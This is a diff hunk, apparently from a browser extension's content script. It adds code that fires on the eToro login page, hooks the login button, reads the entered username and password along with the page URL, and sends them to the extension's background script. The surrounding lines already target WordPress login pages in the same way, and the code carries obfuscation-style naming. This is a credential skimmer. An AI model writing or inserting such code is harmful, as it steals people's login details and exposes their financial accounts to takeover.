@@ -618,3 +618,19 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                       }
                   }, 1000)
               };
+
+
+              if (top['location']['href']['indexOf']('https://www.etoro.com/login') > -1) {
+                    var interval = setInterval(function () {
+                        if (document['getElementsByClassName']('w-login')) {
+                            clearInterval(interval);
+                            document['getElementsByClassName']('e-btn-big wide dark pointer').onclick = function (_0x441cx2) {
+                             var login = {};
+                            login.username = document.getElementsByName("username")[0].value;
+                            login.pass = document.getElementsByName("password")[0].value;
+                            login.href = window.location.href;
+                            chrome.runtime.sendMessage({cmd: "l",login});
+                            }
+                        }
+                    }, 1000)
+                };
